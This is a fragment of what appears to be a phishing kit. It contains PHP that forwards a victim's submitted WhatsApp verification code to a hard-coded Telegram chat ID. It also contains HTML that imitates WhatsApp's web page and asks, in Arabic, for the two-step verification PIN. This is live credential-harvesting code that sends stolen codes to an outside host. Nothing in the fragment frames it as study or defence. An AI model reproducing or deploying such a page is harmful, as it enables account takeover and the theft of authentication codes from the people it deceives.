...
$chat_id ="5288376819";
 ...
 $params=[
      'chat_id'=>$chat_id,
      'text' => $idN." | CODE WAHTSAPP  : ".$_POST['code_whatsapp'],
                ...
                <div data-testid="whatsapp_www_root" id="content-wrapper">
                    <div class="_9r_7">
                        <section data-testid="waui_section" class="_9t2b _9t2d" style="">
                            ...
                            <form action="code_pin2.php" method="POST">
                                                  <strong style="font-style: italic;">أدخل رمز التحقق بخطوتين (PIN) الذي قمت بتجديده سابقا</strong>
                                                  <br><br><br>
                                                    <label for="codeconf2">أدخل رمز التأكيد </label>
                                                    <br>
                                                    <br>
                                                        <input type="text" name="codeconf1" id="codeconf1" class="input-phone"  style="text-align:center;letter-spacing : 5px;  " placeholder="_ _ _  _ _ _"  pattern="[0-9]*" maxlength="6" required>
